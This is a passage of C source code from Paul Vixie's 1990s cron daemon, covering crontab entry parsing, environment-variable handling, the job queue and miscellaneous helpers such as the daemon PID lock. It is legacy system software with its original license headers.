			/* only close pipe if we opened it -- i.e., we're
			 * mailing...
			 */

			if (mailto) {
				Debug(DPROC, ("[%d] closing pipe to mail\n",
					getpid()))
				/* Note: the pclose will probably see
				 * the termination of the grandchild
				 * in addition to the mail process, since
				 * it (the grandchild) is likely to exit
				 * after closing its stdout.
				 */
				status = cron_pclose(mail);
			}

			/* if there was output and we could not mail it,
			 * log the facts so the poor user can figure out
			 * what's going on.
			 */
			if (mailto && status) {
				char buf[MAX_TEMPSTR];

				sprintf(buf,
			"mailed %d byte%s of output but got status 0x%04x\n",
					bytes, (bytes==1)?"":"s",
					status);
				log_it(usernm, getpid(), "MAIL", buf);
			}

		} /*if data from grandchild*/

		Debug(DPROC, ("[%d] got EOF from grandchild\n", getpid()))

		fclose(in);	/* also closes stdout_pipe[READ_PIPE] */
	}

	/* wait for children to die.
	 */
	for (;  children > 0;  children--)
	{
		WAIT_T		waiter;
		PID_T		pid;

		Debug(DPROC, ("[%d] waiting for grandchild #%d to finish\n",
			getpid(), children))
		pid = wait(&waiter);
		if (pid < OK) {
			Debug(DPROC, ("[%d] no more grandchildren--mail written?\n",
				getpid()))
			break;
		}
		Debug(DPROC, ("[%d] grandchild #%d finished, status=%04x",
			getpid(), pid, WEXITSTATUS(waiter)))
		if (WIFSIGNALED(waiter) && WCOREDUMP(waiter))
			Debug(DPROC, (", dumped core"))
		Debug(DPROC, ("\n"))
	}
}


static void
do_univ(u)
	user	*u;
{
#if defined(sequent)
/* Dynix (Sequent) hack to put the user associated with
 * the passed user structure into the ATT universe if
 * necessary.  We have to dig the gecos info out of
 * the user's password entry to see if the magic
 * "universe(att)" string is present.
 */

	struct	passwd	*p;
	char	*s;
	int	i;

	p = getpwuid(u->uid);
	(void) endpwent();

	if (p == NULL)
		return;

	s = p->pw_gecos;

	for (i = 0; i < 4; i++)
	{
		if ((s = strchr(s, ',')) == NULL)
			return;
		s++;
	}
	if (strcmp(s, "universe(att)"))
		return;

	(void) universe(U_ATT);
#endif
}
/* Copyright 1988,1990,1993,1994 by Paul Vixie
 * All rights reserved
 *
 * Distribute freely, except: don't remove my name from the source or
 * documentation (don't take credit for my work), mark your changes (don't
 * get me blamed for your possible bugs), don't alter or remove this
 * notice.  May be sold if buildable source is provided to buyer.  No
 * warrantee of any kind, express or implied, is included with this
 * software; use at your own risk, responsibility for damages (if any) to
 * anyone resulting from the use of this software rests entirely with the
 * user.
 *
 * Send bug reports, bug fixes, enhancements, requests, flames, etc., and
 * I'll try to keep a version up to date.  I can be reached as follows:
 * Paul Vixie          <paul@vix.com>          uunet!decwrl!vixie!paul
 */

#if !defined(lint) && !defined(LINT)
static char rcsid[] = "$Id: entry.c,v 2.12 1994/01/17 03:20:37 vixie Exp $";
#endif

/* vix 26jan87 [RCS'd; rest of log is in RCS file]
 * vix 01jan87 [added line-level error recovery]
 * vix 31dec86 [added /step to the from-to range, per bob@acornrc]
 * vix 30dec86 [written]
 */


#include "cron.h"


typedef	enum ecode {
	e_none, e_minute, e_hour, e_dom, e_month, e_dow,
	e_cmd, e_timespec, e_username
} ecode_e;

static char	get_list __P((bitstr_t *, int, int, char *[], int, FILE *)),
		get_range __P((bitstr_t *, int, int, char *[], int, FILE *)),
		get_number __P((int *, int, char *[], int, FILE *));
static int	set_element __P((bitstr_t *, int, int, int));

static char *ecodes[] =
	{
		"no error",
		"bad minute",
		"bad hour",
		"bad day-of-month",
		"bad month",
		"bad day-of-week",
		"bad command",
		"bad time specifier",
		"bad username",
	};


void
free_entry(e)
	entry	*e;
{
	free(e->cmd);
	env_free(e->envp);
	free(e);
}


/* return NULL if eof or syntax error occurs;
 * otherwise return a pointer to a new entry.
 */
entry *
load_entry(file, error_func, pw, envp)
	FILE		*file;
	void		(*error_func)();
	struct passwd	*pw;
	char		**envp;
{
	/* this function reads one crontab entry -- the next -- from a file.
	 * it skips any leading blank lines, ignores comments, and returns
	 * EOF if for any reason the entry can't be read and parsed.
	 *
	 * the entry is also parsed here.
	 *
	 * syntax:
	 *   user crontab:
	 *	minutes hours doms months dows cmd\n
	 *   system crontab (/etc/crontab):
	 *	minutes hours doms months dows USERNAME cmd\n
	 */

	ecode_e	ecode = e_none;
	entry	*e;
	int	ch;
	char	cmd[MAX_COMMAND];
	char	envstr[MAX_ENVSTR];

	Debug(DPARS, ("load_entry()...about to eat comments\n"))

	skip_comments(file);

	ch = get_char(file);
	if (ch == EOF)
		return NULL;

	/* ch is now the first useful character of a useful line.
	 * it may be an @special or it may be the first character
	 * of a list of minutes.
	 */

	e = (entry *) calloc(sizeof(entry), sizeof(char));

	if (ch == '@') {
		/* all of these should be flagged and load-limited; i.e.,
		 * instead of @hourly meaning "0 * * * *" it should mean
		 * "close to the front of every hour but not 'til the
		 * system load is low".  Problems are: how do you know
		 * what "low" means? (save me from /etc/cron.conf!) and:
		 * how to guarantee low variance (how low is low?), which
		 * means how to we run roughly every hour -- seems like
		 * we need to keep a history or let the first hour set
		 * the schedule, which means we aren't load-limited
		 * anymore.  too much for my overloaded brain. (vix, jan90)
		 * HINT
		 */
		ch = get_string(cmd, MAX_COMMAND, file, " \t\n");
		if (!strcmp("reboot", cmd)) {
			e->flags |= WHEN_REBOOT;
		} else if (!strcmp("yearly", cmd) || !strcmp("annually", cmd)){
			bit_set(e->minute, 0);
			bit_set(e->hour, 0);
			bit_set(e->dom, 0);
			bit_set(e->month, 0);
			bit_nset(e->dow, 0, (LAST_DOW-FIRST_DOW+1));
		} else if (!strcmp("monthly", cmd)) {
			bit_set(e->minute, 0);
			bit_set(e->hour, 0);
			bit_set(e->dom, 0);
			bit_nset(e->month, 0, (LAST_MONTH-FIRST_MONTH+1));
			bit_nset(e->dow, 0, (LAST_DOW-FIRST_DOW+1));
		} else if (!strcmp("weekly", cmd)) {
			bit_set(e->minute, 0);
			bit_set(e->hour, 0);
			bit_nset(e->dom, 0, (LAST_DOM-FIRST_DOM+1));
			bit_nset(e->month, 0, (LAST_MONTH-FIRST_MONTH+1));
			bit_set(e->dow, 0);
		} else if (!strcmp("daily", cmd) || !strcmp("midnight", cmd)) {
			bit_set(e->minute, 0);
			bit_set(e->hour, 0);
			bit_nset(e->dom, 0, (LAST_DOM-FIRST_DOM+1));
			bit_nset(e->month, 0, (LAST_MONTH-FIRST_MONTH+1));
			bit_nset(e->dow, 0, (LAST_DOW-FIRST_DOW+1));
		} else if (!strcmp("hourly", cmd)) {
			bit_set(e->minute, 0);
			bit_set(e->hour, (LAST_HOUR-FIRST_HOUR+1));
			bit_nset(e->dom, 0, (LAST_DOM-FIRST_DOM+1));
			bit_nset(e->month, 0, (LAST_MONTH-FIRST_MONTH+1));
			bit_nset(e->dow, 0, (LAST_DOW-FIRST_DOW+1));
		} else {
			ecode = e_timespec;
			goto eof;
		}
	} else {
		Debug(DPARS, ("load_entry()...about to parse numerics\n"))

		ch = get_list(e->minute, FIRST_MINUTE, LAST_MINUTE,
			      PPC_NULL, ch, file);
		if (ch == EOF) {
			ecode = e_minute;
			goto eof;
		}

		/* hours
		 */

		ch = get_list(e->hour, FIRST_HOUR, LAST_HOUR,
			      PPC_NULL, ch, file);
		if (ch == EOF) {
			ecode = e_hour;
			goto eof;
		}

		/* DOM (days of month)
		 */

		if (ch == '*')
			e->flags |= DOM_STAR;
		ch = get_list(e->dom, FIRST_DOM, LAST_DOM,
			      PPC_NULL, ch, file);
		if (ch == EOF) {
			ecode = e_dom;
			goto eof;
		}

		/* month
		 */

		ch = get_list(e->month, FIRST_MONTH, LAST_MONTH,
			      MonthNames, ch, file);
		if (ch == EOF) {
			ecode = e_month;
			goto eof;
		}

		/* DOW (days of week)
		 */

		if (ch == '*')
			e->flags |= DOW_STAR;
		ch = get_list(e->dow, FIRST_DOW, LAST_DOW,
			      DowNames, ch, file);
		if (ch == EOF) {
			ecode = e_dow;
			goto eof;
		}
	}

	/* make sundays equivilent */
	if (bit_test(e->dow, 0) || bit_test(e->dow, 7)) {
		bit_set(e->dow, 0);
		bit_set(e->dow, 7);
	}

	/* ch is the first character of a command, or a username */
	unget_char(ch, file);

	if (!pw) {
		char		*username = cmd;	/* temp buffer */

		Debug(DPARS, ("load_entry()...about to parse username\n"))
		ch = get_string(username, MAX_COMMAND, file, " \t");

		Debug(DPARS, ("load_entry()...got %s\n",username))
		if (ch == EOF) {
			ecode = e_cmd;
			goto eof;
		}

		pw = getpwnam(username);
		if (pw == NULL) {
			ecode = e_username;
			goto eof;
		}
		Debug(DPARS, ("load_entry()...uid %d, gid %d\n",e->uid,e->gid))
	}

	e->uid = pw->pw_uid;
	e->gid = pw->pw_gid;

	/* copy and fix up environment.  some variables are just defaults and
	 * others are overrides.
	 */
	e->envp = env_copy(envp);
	if (!env_get("SHELL", e->envp)) {
		sprintf(envstr, "SHELL=%s", _PATH_BSHELL);
		e->envp = env_set(e->envp, envstr);
	}
	if (!env_get("HOME", e->envp)) {
		sprintf(envstr, "HOME=%s", pw->pw_dir);
		e->envp = env_set(e->envp, envstr);
	}
	if (!env_get("PATH", e->envp)) {
		sprintf(envstr, "PATH=%s", _PATH_DEFPATH);
		e->envp = env_set(e->envp, envstr);
	}
	sprintf(envstr, "%s=%s", "LOGNAME", pw->pw_name);
	e->envp = env_set(e->envp, envstr);
#if defined(BSD)
	sprintf(envstr, "%s=%s", "USER", pw->pw_name);
	e->envp = env_set(e->envp, envstr);
#endif

	Debug(DPARS, ("load_entry()...about to parse command\n"))

	/* Everything up to the next \n or EOF is part of the command...
	 * too bad we don't know in advance how long it will be, since we
	 * need to malloc a string for it... so, we limit it to MAX_COMMAND.
	 * XXX - should use realloc().
	 */ 
	ch = get_string(cmd, MAX_COMMAND, file, "\n");

	/* a file without a \n before the EOF is rude, so we'll complain...
	 */
	if (ch == EOF) {
		ecode = e_cmd;
		goto eof;
	}

	/* got the command in the 'cmd' string; save it in *e.
	 */
	e->cmd = strdup(cmd);

	Debug(DPARS, ("load_entry()...returning successfully\n"))

	/* success, fini, return pointer to the entry we just created...
	 */
	return e;

 eof:
	free(e);
	if (ecode != e_none && error_func)
		(*error_func)(ecodes[(int)ecode]);
	while (ch != EOF && ch != '\n')
		ch = get_char(file);
	return NULL;
}


static char
get_list(bits, low, high, names, ch, file)
	bitstr_t	*bits;		/* one bit per flag, default=FALSE */
	int		low, high;	/* bounds, impl. offset for bitstr */
	char		*names[];	/* NULL or *[] of names for these elements */
	int		ch;		/* current character being processed */
	FILE		*file;		/* file being read */
{
	register int	done;

	/* we know that we point to a non-blank character here;
	 * must do a Skip_Blanks before we exit, so that the
	 * next call (or the code that picks up the cmd) can
	 * assume the same thing.
	 */

	Debug(DPARS|DEXT, ("get_list()...entered\n"))

	/* list = range {"," range}
	 */
	
	/* clear the bit string, since the default is 'off'.
	 */
	bit_nclear(bits, 0, (high-low+1));

	/* process all ranges
	 */
	done = FALSE;
	while (!done) {
		ch = get_range(bits, low, high, names, ch, file);
		if (ch == ',')
			ch = get_char(file);
		else
			done = TRUE;
	}

	/* exiting.  skip to some blanks, then skip over the blanks.
	 */
	Skip_Nonblanks(ch, file)
	Skip_Blanks(ch, file)

	Debug(DPARS|DEXT, ("get_list()...exiting w/ %02x\n", ch))

	return ch;
}


static char
get_range(bits, low, high, names, ch, file)
	bitstr_t	*bits;		/* one bit per flag, default=FALSE */
	int		low, high;	/* bounds, impl. offset for bitstr */
	char		*names[];	/* NULL or names of elements */
	int		ch;		/* current character being processed */
	FILE		*file;		/* file being read */
{
	/* range = number | number "-" number [ "/" number ]
	 */

	register int	i;
	auto int	num1, num2, num3;

	Debug(DPARS|DEXT, ("get_range()...entering, exit won't show\n"))

	if (ch == '*') {
		/* '*' means "first-last" but can still be modified by /step
		 */
		num1 = low;
		num2 = high;
		ch = get_char(file);
		if (ch == EOF)
			return EOF;
	} else {
		if (EOF == (ch = get_number(&num1, low, names, ch, file)))
			return EOF;

		if (ch != '-') {
			/* not a range, it's a single number.
			 */
			if (EOF == set_element(bits, low, high, num1))
				return EOF;
			return ch;
		} else {
			/* eat the dash
			 */
			ch = get_char(file);
			if (ch == EOF)
				return EOF;

			/* get the number following the dash
			 */
			ch = get_number(&num2, low, names, ch, file);
			if (ch == EOF)
				return EOF;
		}
	}

	/* check for step size
	 */
	if (ch == '/') {
		/* eat the slash
		 */
		ch = get_char(file);
		if (ch == EOF)
			return EOF;

		/* get the step size -- note: we don't pass the
		 * names here, because the number is not an
		 * element id, it's a step size.  'low' is
		 * sent as a 0 since there is no offset either.
		 */
		ch = get_number(&num3, 0, PPC_NULL, ch, file);
		if (ch == EOF)
			return EOF;
	} else {
		/* no step.  default==1.
		 */
		num3 = 1;
	}

	/* range. set all elements from num1 to num2, stepping
	 * by num3.  (the step is a downward-compatible extension
	 * proposed conceptually by bob@acornrc, syntactically
	 * designed then implmented by paul vixie).
	 */
	for (i = num1;  i <= num2;  i += num3)
		if (EOF == set_element(bits, low, high, i))
			return EOF;

	return ch;
}


static char
get_number(numptr, low, names, ch, file)
	int	*numptr;	/* where does the result go? */
	int	low;		/* offset applied to result if symbolic enum used */
	char	*names[];	/* symbolic names, if any, for enums */
	int	ch;		/* current character */
	FILE	*file;		/* source */
{
	char	temp[MAX_TEMPSTR], *pc;
	int	len, i, all_digits;

	/* collect alphanumerics into our fixed-size temp array
	 */
	pc = temp;
	len = 0;
	all_digits = TRUE;
	while (isalnum(ch)) {
		if (++len >= MAX_TEMPSTR)
			return EOF;

		*pc++ = ch;

		if (!isdigit(ch))
			all_digits = FALSE;

		ch = get_char(file);
	}
	*pc = '\0';

	/* try to find the name in the name list
	 */
	if (names) {
		for (i = 0;  names[i] != NULL;  i++) {
			Debug(DPARS|DEXT,
				("get_num, compare(%s,%s)\n", names[i], temp))
			if (!strcasecmp(names[i], temp)) {
				*numptr = i+low;
				return ch;
			}
		}
	}

	/* no name list specified, or there is one and our string isn't
	 * in it.  either way: if it's all digits, use its magnitude.
	 * otherwise, it's an error.
	 */
	if (all_digits) {
		*numptr = atoi(temp);
		return ch;
	}

	return EOF;
}


static int
set_element(bits, low, high, number)
	bitstr_t	*bits; 		/* one bit per flag, default=FALSE */
	int		low;
	int		high;
	int		number;
{
	Debug(DPARS|DEXT, ("set_element(?,%d,%d,%d)\n", low, high, number))

	if (number < low || number > high)
		return EOF;

	bit_set(bits, (number-low));
	return OK;
}
/* Copyright 1988,1990,1993,1994 by Paul Vixie
 * All rights reserved
 *
 * Distribute freely, except: don't remove my name from the source or
 * documentation (don't take credit for my work), mark your changes (don't
 * get me blamed for your possible bugs), don't alter or remove this
 * notice.  May be sold if buildable source is provided to buyer.  No
 * warrantee of any kind, express or implied, is included with this
 * software; use at your own risk, responsibility for damages (if any) to
 * anyone resulting from the use of this software rests entirely with the
 * user.
 *
 * Send bug reports, bug fixes, enhancements, requests, flames, etc., and
 * I'll try to keep a version up to date.  I can be reached as follows:
 * Paul Vixie          <paul@vix.com>          uunet!decwrl!vixie!paul
 */

#if !defined(lint) && !defined(LINT)
static char rcsid[] = "$Id: env.c,v 2.7 1994/01/26 02:25:50 vixie Exp vixie $";
#endif

#include "cron.h"


char **
env_init()
{
	register char	**p = (char **) malloc(sizeof(char **));

	p[0] = NULL;
	return (p);
}


void
env_free(envp)
	char	**envp;
{
	char	**p;

	for (p = envp;  *p;  p++)
		free(*p);
	free(envp);
}


char **
env_copy(envp)
	register char	**envp;
{
	register int	count, i;
	register char	**p;

	for (count = 0;  envp[count] != NULL;  count++)
		;
	p = (char **) malloc((count+1) * sizeof(char *));  /* 1 for the NULL */
	for (i = 0;  i < count;  i++)
		p[i] = strdup(envp[i]);
	p[count] = NULL;
	return (p);
}


char **
env_set(envp, envstr)
	char	**envp;
	char	*envstr;
{
	register int	count, found;
	register char	**p;

	/*
	 * count the number of elements, including the null pointer;
	 * also set 'found' to -1 or index of entry if already in here.
	 */
	found = -1;
	for (count = 0;  envp[count] != NULL;  count++) {
		if (!strcmp_until(envp[count], envstr, '='))
			found = count;
	}
	count++;	/* for the NULL */

	if (found != -1) {
		/*
		 * it exists already, so just free the existing setting,
		 * save our new one there, and return the existing array.
		 */
		free(envp[found]);
		envp[found] = strdup(envstr);
		return (envp);
	}

	/*
	 * it doesn't exist yet, so resize the array, move null pointer over
	 * one, save our string over the old null pointer, and return resized
	 * array.
	 */
	p = (char **) realloc((void *) envp,
			      (unsigned) ((count+1) * sizeof(char **)));
	p[count] = p[count-1];
	p[count-1] = strdup(envstr);
	return (p);
}


/* return	ERR = end of file
 *		FALSE = not an env setting (file was repositioned)
 *		TRUE = was an env setting
 */
int
load_env(envstr, f)
	char	*envstr;
	FILE	*f;
{
	long	filepos;
	int	fileline;
	char	name[MAX_TEMPSTR], val[MAX_ENVSTR];
	int	fields;

	filepos = ftell(f);
	fileline = LineNumber;
	skip_comments(f);
	if (EOF == get_string(envstr, MAX_ENVSTR, f, "\n"))
		return (ERR);

	Debug(DPARS, ("load_env, read <%s>\n", envstr))

	name[0] = val[0] = '\0';
	fields = sscanf(envstr, "%[^ =] = %[^\n#]", name, val);
	if (fields != 2) {
		Debug(DPARS, ("load_env, not 2 fields (%d)\n", fields))
		fseek(f, filepos, 0);
		Set_LineNum(fileline);
		return (FALSE);
	}

	/* 2 fields from scanf; looks like an env setting
	 */

	/*
	 * process value string
	 */
	/*local*/{
		int	len = strdtb(val);

		if (len >= 2) {
			if (val[0] == '\'' || val[0] == '"') {
				if (val[len-1] == val[0]) {
					val[len-1] = '\0';
					(void) strcpy(val, val+1);
				}
			}
		}
	}

	(void) sprintf(envstr, "%s=%s", name, val);
	Debug(DPARS, ("load_env, <%s> <%s> -> <%s>\n", name, val, envstr))
	return (TRUE);
}


char *
env_get(name, envp)
	register char	*name;
	register char	**envp;
{
	register int	len = strlen(name);
	register char	*p, *q;

	while (p = *envp++) {
		if (!(q = strchr(p, '=')))
			continue;
		if ((q - p) == len && !strncmp(p, name, len))
			return (q+1);
	}
	return (NULL);
}
/* Copyright 1993,1994 by Paul Vixie
 * All rights reserved
 *
 * Distribute freely, except: don't remove my name from the source or
 * documentation (don't take credit for my work), mark your changes (don't
 * get me blamed for your possible bugs), don't alter or remove this
 * notice.  May be sold if buildable source is provided to buyer.  No
 * warrantee of any kind, express or implied, is included with this
 * software; use at your own risk, responsibility for damages (if any) to
 * anyone resulting from the use of this software rests entirely with the
 * user.
 *
 * Send bug reports, bug fixes, enhancements, requests, flames, etc., and
 * I'll try to keep a version up to date.  I can be reached as follows:
 * Paul Vixie          <paul@vix.com>          uunet!decwrl!vixie!paul
 */

#if defined(POSIX) || defined(ATT)
# include <stdlib.h>
# include <unistd.h>
# include <string.h>
# include <dirent.h>
# define DIR_T	struct dirent
# define WAIT_T	int
# define WAIT_IS_INT 1
extern char *tzname[2];
# define TZONE(tm) tzname[(tm).tm_isdst]
#endif

#if defined(UNIXPC)
# undef WAIT_T
# undef WAIT_IS_INT
# define WAIT_T	union wait
#endif

#if defined(POSIX)
# define SIG_T	sig_t
# define TIME_T	time_t
# define PID_T pid_t
#endif

#if defined(ATT)
# define SIG_T	void
# define TIME_T	long
# define PID_T int
#endif

#if !defined(POSIX) && !defined(ATT)
/* classic BSD */
extern	time_t		time();
extern	unsigned	sleep();
extern	struct tm	*localtime();
extern	struct passwd	*getpwnam();
extern	int		errno;
extern	void		perror(), exit(), free();
extern	char		*getenv(), *strcpy(), *strchr(), *strtok();
extern	void		*malloc(), *realloc();
# define SIG_T	void
# define TIME_T	long
# define PID_T int
# define WAIT_T	union wait
# define DIR_T	struct direct
# include <sys/dir.h>
# define TZONE(tm) (tm).tm_zone
#endif

/* getopt() isn't part of POSIX.  some systems define it in <stdlib.h> anyway.
 * of those that do, some complain that our definition is different and some
 * do not.  to add to the misery and confusion, some systems define getopt()
 * in ways that we cannot predict or comprehend, yet do not define the adjunct
 * external variables needed for the interface.
 */
#if (!defined(BSD) || (BSD < 198911)) && !defined(ATT) && !defined(UNICOS)
int	getopt __P((int, char * const *, const char *));
#endif

#if (!defined(BSD) || (BSD < 199103))
extern	char *optarg;
extern	int optind, opterr, optopt;
#endif

#if WAIT_IS_INT
# ifndef WEXITSTATUS
#  define WEXITSTATUS(x) (((x) >> 8) & 0xff)
# endif
# ifndef WTERMSIG
#  define WTERMSIG(x)	((x) & 0x7f)
# endif
# ifndef WCOREDUMP
#  define WCOREDUMP(x)	((x) & 0x80)
# endif
#else /*WAIT_IS_INT*/
# ifndef WEXITSTATUS
#  define WEXITSTATUS(x) ((x).w_retcode)
# endif
# ifndef WTERMSIG
#  define WTERMSIG(x)	((x).w_termsig)
# endif
# ifndef WCOREDUMP
#  define WCOREDUMP(x)	((x).w_coredump)
# endif
#endif /*WAIT_IS_INT*/

#ifndef WIFSIGNALED
#define WIFSIGNALED(x)	(WTERMSIG(x) != 0)
#endif
#ifndef WIFEXITED
#define WIFEXITED(x)	(WTERMSIG(x) == 0)
#endif

#ifdef NEED_STRCASECMP
extern	int		strcasecmp __P((char *, char *));
#endif

#ifdef NEED_STRDUP
extern	char		*strdup __P((char *));
#endif

#ifdef NEED_STRERROR
extern	char		*strerror __P((int));
#endif

#ifdef NEED_FLOCK
extern	int		flock __P((int, int));
# define LOCK_SH 1
# define LOCK_EX 2
# define LOCK_NB 4
# define LOCK_UN 8
#endif

#ifdef NEED_SETSID
extern	int		setsid __P((void));
#endif

#ifdef NEED_GETDTABLESIZE
extern	int		getdtablesize __P((void));
#endif

#ifdef NEED_SETENV
extern	int		setenv __P((char *, char *, int));
#endif

#ifdef NEED_VFORK
extern	PID_T		vfork __P((void));
#endif
/* Copyright 1988,1990,1993,1994 by Paul Vixie
 * All rights reserved
 *
 * Distribute freely, except: don't remove my name from the source or
 * documentation (don't take credit for my work), mark your changes (don't
 * get me blamed for your possible bugs), don't alter or remove this
 * notice.  May be sold if buildable source is provided to buyer.  No
 * warrantee of any kind, express or implied, is included with this
 * software; use at your own risk, responsibility for damages (if any) to
 * anyone resulting from the use of this software rests entirely with the
 * user.
 *
 * Send bug reports, bug fixes, enhancements, requests, flames, etc., and
 * I'll try to keep a version up to date.  I can be reached as follows:
 * Paul Vixie          <paul@vix.com>          uunet!decwrl!vixie!paul
 */

#if !defined(lint) && !defined(LINT)
static char rcsid[] = "$Id: job.c,v 1.6 1994/01/15 20:43:43 vixie Exp $";
#endif


#include "cron.h"


typedef	struct _job {
	struct _job	*next;
	entry		*e;
	user		*u;
} job;


static job	*jhead = NULL, *jtail = NULL;


void
job_add(e, u)
	register entry *e;
	register user *u;
{
	register job *j;

	/* if already on queue, keep going */
	for (j=jhead; j; j=j->next)
		if (j->e == e && j->u == u) { return; }

	/* build a job queue element */
	j = (job*)malloc(sizeof(job));
	j->next = (job*) NULL;
	j->e = e;
	j->u = u;

	/* add it to the tail */
	if (!jhead) { jhead=j; }
	else { jtail->next=j; }
	jtail = j;
}


int
job_runqueue()
{
	register job	*j, *jn;
	register int	run = 0;

	for (j=jhead; j; j=jn) {
		do_command(j->e, j->u);
		jn = j->next;
		free(j);
		run++;
	}
	jhead = jtail = NULL;
	return run;
}
/* Copyright 1988,1990,1993,1994 by Paul Vixie
 * All rights reserved
 *
 * Distribute freely, except: don't remove my name from the source or
 * documentation (don't take credit for my work), mark your changes (don't
 * get me blamed for your possible bugs), don't alter or remove this
 * notice.  May be sold if buildable source is provided to buyer.  No
 * warrantee of any kind, express or implied, is included with this
 * software; use at your own risk, responsibility for damages (if any) to
 * anyone resulting from the use of this software rests entirely with the
 * user.
 *
 * Send bug reports, bug fixes, enhancements, requests, flames, etc., and
 * I'll try to keep a version up to date.  I can be reached as follows:
 * Paul Vixie          <paul@vix.com>          uunet!decwrl!vixie!paul
 */

#if !defined(lint) && !defined(LINT)
static char rcsid[] = "$Id: misc.c,v 2.9 1994/01/15 20:43:43 vixie Exp $";
#endif

/* vix 26jan87 [RCS has the rest of the log]
 * vix 30dec86 [written]
 */


#include "cron.h"
#if SYS_TIME_H
# include <sys/time.h>
#else
# include <time.h>
#endif
#include <sys/file.h>
#include <sys/stat.h>
#include <errno.h>
#include <string.h>
#include <fcntl.h>
#if defined(SYSLOG)
# include <syslog.h>
#endif


#if defined(LOG_DAEMON) && !defined(LOG_CRON)
#define LOG_CRON LOG_DAEMON
#endif


static int		LogFD = ERR;


int
strcmp_until(left, right, until)
	char	*left;
	char	*right;
	int	until;
{
	register int	diff;

	while (*left && *left != until && *left == *right) {
		left++;
		right++;
	}

	if ((*left=='\0' || *left == until) &&
	    (*right=='\0' || *right == until)) {
		diff = 0;
	} else {
		diff = *left - *right;
	}

	return diff;
}


/* strdtb(s) - delete trailing blanks in string 's' and return new length
 */
int
strdtb(s)
	char	*s;
{
	char	*x = s;

	/* scan forward to the null
	 */
	while (*x)
		x++;

	/* scan backward to either the first character before the string,
	 * or the last non-blank in the string, whichever comes first.
	 */
	do	{x--;}
	while (x >= s && isspace(*x));

	/* one character beyond where we stopped above is where the null
	 * goes.
	 */
	*++x = '\0';

	/* the difference between the position of the null character and
	 * the position of the first character of the string is the length.
	 */
	return x - s;
}


int
set_debug_flags(flags)
	char	*flags;
{
	/* debug flags are of the form    flag[,flag ...]
	 *
	 * if an error occurs, print a message to stdout and return FALSE.
	 * otherwise return TRUE after setting ERROR_FLAGS.
	 */

#if !DEBUGGING

	printf("this program was compiled without debugging enabled\n");
	return FALSE;

#else /* DEBUGGING */

	char	*pc = flags;

	DebugFlags = 0;

	while (*pc) {
		char	**test;
		int	mask;

		/* try to find debug flag name in our list.
		 */
		for (	test = DebugFlagNames, mask = 1;
			*test && strcmp_until(*test, pc, ',');
			test++, mask <<= 1
		    )
			;

		if (!*test) {
			fprintf(stderr,
				"unrecognized debug flag <%s> <%s>\n",
				flags, pc);
			return FALSE;
		}

		DebugFlags |= mask;

		/* skip to the next flag
		 */
		while (*pc && *pc != ',')
			pc++;
		if (*pc == ',')
			pc++;
	}

	if (DebugFlags) {
		int	flag;

		fprintf(stderr, "debug flags enabled:");

		for (flag = 0;  DebugFlagNames[flag];  flag++)
			if (DebugFlags & (1 << flag))
				fprintf(stderr, " %s", DebugFlagNames[flag]);
		fprintf(stderr, "\n");
	}

	return TRUE;

#endif /* DEBUGGING */
}


void
set_cron_uid()
{
#if defined(BSD) || defined(POSIX)
	if (seteuid(ROOT_UID) < OK) {
		perror("seteuid");
		exit(ERROR_EXIT);
	}
#else
	if (setuid(ROOT_UID) < OK) {
		perror("setuid");
		exit(ERROR_EXIT);
	}
#endif
}


void
set_cron_cwd()
{
	struct stat	sb;

	/* first check for CRONDIR ("/var/cron" or some such)
	 */
	if (stat(CRONDIR, &sb) < OK && errno == ENOENT) {
		perror(CRONDIR);
		if (OK == mkdir(CRONDIR, 0700)) {
			fprintf(stderr, "%s: created\n", CRONDIR);
			stat(CRONDIR, &sb);
		} else {
			fprintf(stderr, "%s: ", CRONDIR);
			perror("mkdir");
			exit(ERROR_EXIT);
		}
	}
	if (!(sb.st_mode & S_IFDIR)) {
		fprintf(stderr, "'%s' is not a directory, bailing out.\n",
			CRONDIR);
		exit(ERROR_EXIT);
	}
	if (chdir(CRONDIR) < OK) {
		fprintf(stderr, "cannot chdir(%s), bailing out.\n", CRONDIR);
		perror(CRONDIR);
		exit(ERROR_EXIT);
	}

	/* CRONDIR okay (now==CWD), now look at SPOOL_DIR ("tabs" or some such)
	 */
	if (stat(SPOOL_DIR, &sb) < OK && errno == ENOENT) {
		perror(SPOOL_DIR);
		if (OK == mkdir(SPOOL_DIR, 0700)) {
			fprintf(stderr, "%s: created\n", SPOOL_DIR);
			stat(SPOOL_DIR, &sb);
		} else {
			fprintf(stderr, "%s: ", SPOOL_DIR);
			perror("mkdir");
			exit(ERROR_EXIT);
		}
	}
	if (!(sb.st_mode & S_IFDIR)) {
		fprintf(stderr, "'%s' is not a directory, bailing out.\n",
			SPOOL_DIR);
		exit(ERROR_EXIT);
	}
}


/* acquire_daemonlock() - write our PID into /etc/cron.pid, unless
 *	another daemon is already running, which we detect here.
 *
 * note: main() calls us twice; once before forking, once after.
 *	we maintain static storage of the file pointer so that we
 *	can rewrite our PID into the PIDFILE after the fork.
 *
 * it would be great if fflush() disassociated the file buffer.
 */
void
acquire_daemonlock(closeflag)
	int closeflag;
{
	static	FILE	*fp = NULL;

	if (closeflag && fp) {
		fclose(fp);
		fp = NULL;
		return;
	}

	if (!fp) {
		char	pidfile[MAX_FNAME];
		char	buf[MAX_TEMPSTR];
		int	fd, otherpid;

		(void) sprintf(pidfile, PIDFILE, PIDDIR);
		if ((-1 == (fd = open(pidfile, O_RDWR|O_CREAT, 0644)))
		    || (NULL == (fp = fdopen(fd, "r+")))
		    ) {
			sprintf(buf, "can't open or create %s: %s",
				pidfile, strerror(errno));
			fprintf(stderr, "%s: %s\n", ProgramName, buf);
			log_it("CRON", getpid(), "DEATH", buf);
			exit(ERROR_EXIT);
		}

		if (flock(fd, LOCK_EX|LOCK_NB) < OK) {
			int save_errno = errno;

			fscanf(fp, "%d", &otherpid);
			sprintf(buf, "can't lock %s, otherpid may be %d: %s",
				pidfile, otherpid, strerror(save_errno));
			fprintf(stderr, "%s: %s\n", ProgramName, buf);
			log_it("CRON", getpid(), "DEATH", buf);
			exit(ERROR_EXIT);
		}

		(void) fcntl(fd, F_SETFD, 1);
	}

	rewind(fp);
	fprintf(fp, "%d\n", getpid());
	fflush(fp);
	(void) ftruncate(fileno(fp), ftell(fp));

	/* abandon fd and fp even though the file is open. we need to
	 * keep it open and locked, but we don't need the handles elsewhere.
	 */
}

/* get_char(file) : like getc() but increment LineNumber on newlines
 */
int
get_char(file)
	FILE	*file;
{
	int	ch;

	ch = getc(file);
	if (ch == '\n')
		Set_LineNum(LineNumber + 1)
	return ch;
}


/* unget_char(ch, file) : like ungetc but do LineNumber processing
 */
void
unget_char(ch, file)
